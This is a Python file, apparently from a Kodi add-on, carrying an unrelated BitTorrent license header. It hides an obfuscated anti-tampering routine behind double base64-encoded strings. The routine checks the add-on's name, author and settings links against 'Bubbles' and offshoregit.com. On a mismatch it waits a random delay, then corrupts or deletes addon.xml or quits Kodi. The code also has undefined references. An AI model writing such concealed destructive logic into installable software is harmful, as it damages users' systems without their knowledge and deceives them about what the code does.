# The contents of this file are subject to the BitTorrent Open Source License
# Version 1.1 (the License).  You may not copy or use this file, in either
# source code or executable form, except in compliance with the License.  You
# may obtain a copy of the License at http://www.bittorrent.com/license/.
#
# Software distributed under the License is distributed on an AS IS basis,
# WITHOUT WARRANTY OF ANY KIND, either express or implied.  See the License
# for the specific language governing rights and limitations under the
# License.

import time, os, sys, random

if __name__== '__main__':

	def __x(d):
		try:
			t = 'bas' + 'e'
			t += str(72 - 8)
			d = d.decode(t)
			d = d.decode(t)
			return d[:-1]
		except:
			return ''

	pc = os.path.dirname(os.path.realpath(__file__))
	pr = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir)), os.pardir))
	px = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir))
	pl = os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir))
	pe = os.path.join(pl, __x('WlhoMFpXNXphVzl1Y3lBPQ=='))
	pa = os.path.join(pr, __x('WVdSa2IyNHVlRzFzSUE9PQ=='))
	ps = os.path.join(px, __x('YzJWMGRHbHVaM011ZUcxc0lBPT0='))

	def __y(x):
		import xbmc
		xbmc.executebuiltin(x)

	def __a(x, y):
		import xbmcaddon
		return xbmcaddon.Addon(x).getAddonInfo(y)

	def __s(sd, x, y):
		try:
			zi = sd.find(y)
			if zi < 0: return ''
			ze = sd.find('/>', zi)
			if ze < 0: return ''
			sd = sd[zi : ze]
			zi = sd.find(__x('WkdWbVlYVnNkQ0E9'))
			if zi < 0: return ''
			zi = sd.find('"', zi) + 1
			ze = sd.find('"', zi)
			return sd[zi : ze]
		except:
			return ''

	def __e():
		w = random.randint(200, 500)
		time.sleep(w)

		if random.randint(0, 3) == 0:
			try:
				f = open(pa, 'r')
				d = f.read().replace(__x('WEc0Zw=='), __x('UGx4dUlBPT0='), 1)
				f.close()
				f = open(pa, 'w')
				f.write(d)
				f.close()
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				#import shutil
				#shutil.rmtree(pe)
				os.chmod(pa, stat.S_IWRITE)
				os.remove(pa)
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				__y(__x('VVhWcGRDQT0='))
			except:
				pass

	try:
		f = open(pa, 'r')
		d = f.read()
		f.close()

		s = d.find(__x('UEdGa1pHOXVJR2xrUFNJZw==')) + 11
		e = d.find('"', s)
		ti = d[s : e]
		tn = __a(ti, __x('Ym1GdFpTQT0='))
		ta = __a(ti, __x('WVhWMGFHOXlJQT09'))
		tb = __x('UW5WaVlteGxjeUE9')
		tl = __x('YjJabWMyaHZjbVZuYVhRdVkyOXRMMkoxWW1Kc1pYTWc=')

		if not tn == tb or not ta == tb:
			__e()
		else:
			xx = None
			with open(ps, 'r') as ff:
				xx = ff.read()
			if not tl in __s(xx, ti, __x('YkdsdWF5NXdjbVZ0YVhWdGFYcGxJQT09')):
				__e()
			elif not tl in __s(xx, ti, __x('YkdsdWF5NXlaV0ZzWkdWaWNtbGtJQT09')):
				_f()
			elif not tl in __s(xx, ti, __x('YkdsdWF5NWxZWE41Ym1WM2N5QT0=')):
				__e()
	except:
		#__e()
		pass
